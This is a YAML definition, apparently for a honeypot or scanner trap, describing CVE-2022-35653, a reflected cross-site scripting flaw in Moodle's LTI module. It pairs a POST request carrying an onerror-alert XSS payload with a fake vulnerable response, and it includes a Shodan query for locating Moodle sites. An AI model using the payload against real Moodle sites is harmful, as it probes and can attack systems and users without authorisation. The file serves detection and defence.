id: CVE-2022-35653
info:
  name: Moodle LTI module Reflected - Cross-Site Scripting
  author: iamnoooob,pdresearch
  description: 'A reflected XSS issue was identified in the LTI module of Moodle.
    The vulnerability exists due to insufficient sanitization of user-supplied data
    in the LTI module. A remote attacker can trick the victim to follow a specially
    crafted link and execute arbitrary HTML and script code in user''s browser in
    context of vulnerable website to steal potentially sensitive information, change
    appearance of the web page, can perform phishing and drive-by-download attacks.

    '
  severity: medium
  reference:
  - http://git.moodle.org/gw?p=moodle.git&a=search&h=HEAD&st=commit&s=MDL-72299
  - https://nvd.nist.gov/vuln/detail/CVE-2022-35653
  - https://bugzilla.redhat.com/show_bug.cgi?id=2106277
  - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6MOKYVRNFNAODP2XSMGJ5CRDUZCZKAR3/
  - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/MTKUSFPSYFINSQFSOHDQIDVE6FWBEU6V/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-35653
    cwe-id: CWE-79
    epss-score: 0.00921
    epss-percentile: 0.82544
    cpe: cpe:2.3:a:moodle:moodle:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: moodle
    product: moodle
    shodan-query: title:"Moodle"
  tags: cve,cve2022,moodle,xss
traps:
- request:
    method: POST
    path: /mod/lti/auth.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'xxx"><img/src%3d''x''onerror%3dalert(''document_domain'')>=1

      '
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: <img/src='x'onerror=alert('document_domain')>moodle-editor
